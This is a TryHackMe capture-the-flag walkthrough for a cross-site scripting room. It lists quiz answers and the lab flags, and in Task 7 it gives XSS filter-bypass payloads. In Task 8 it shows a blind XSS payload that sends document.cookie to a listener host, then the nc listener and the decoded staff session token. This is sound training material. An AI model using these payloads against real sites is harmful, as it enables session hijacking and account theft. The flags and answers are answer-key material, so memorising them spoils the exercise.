# Cross-site Scripting

{% embed url="https://tryhackme.com/room/xssgi" %}
https://tryhackme.com/room/xssgi
{% endembed %}

## Task 1 Room Brief <a href="#title" id="title"></a>

#### What does XSS stand for?

{% hint style="success" %}
`Cross-Site Scripting`
{% endhint %}

## Task 2 XSS Payloads

#### Which document property could contain the user's session token?

{% hint style="success" %}
`document.cookie`
{% endhint %}

#### Which JavaScript method is often used as a Proof Of Concept?

{% hint style="success" %}
`alert`
{% endhint %}

## Task 3 Reflected XSS

#### Where in an URL is a good place to test for reflected XSS?

{% hint style="success" %}
`Parameters`
{% endhint %}

## Task 4 Stored XSS

#### How are stored XSS payloads usually stored on a website?

{% hint style="success" %}
`database`
{% endhint %}

## Task 5 DOM Based XSS

#### What unsafe JavaScript method is good to look for in source code?

{% hint style="success" %}
`eval()`
{% endhint %}

## Task 6 Blind XSS

#### What tool can you use to test for Blind XSS?

{% hint style="success" %}
`xsshunter`
{% endhint %}

#### What type of XSS is very similar to Blind XSS?

{% hint style="success" %}
`Stored XSS`
{% endhint %}

## Task 7 Perfecting your payload

#### What is the flag you received from level six?

```bash
<script>alert('THM');</script>
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 11-53-57.png>)

```bash
Adam"><script>alert('THM');</script>
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 11-55-53.png>)

```bash
</textarea><script>alert('THM');</script>
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 11-59-14.png>)

```bash
';alert('THM');//
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 12-08-09.png>)

```bash
<sscriptcript>alert('THM');</sscriptcript>
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 12-10-08.png>)

```markup
/images/cat.jpg" onload="alert('THM');
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 12-12-57.png>) ![](<../../.gitbook/assets/Screenshot from 2022-04-02 12-14-25.png>)

{% hint style="success" %}
`THM{XSS_MASTER}`
{% endhint %}

## Task 8 Practical Example (Blind XSS)

#### What is the value of the staff-session cookie?

```bash
</textarea><script>fetch('http://10.10.175.111:9001?cookie=' + btoa(document.cookie));</script>
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 13-08-38.png>)

```bash
nc -nvlp 9001
echo -n 'c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==' | base64 -d
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 13-11-04.png>)

{% hint style="success" %}
`4AB305E55955197693F01D6F8FD2D321`
{% endhint %}
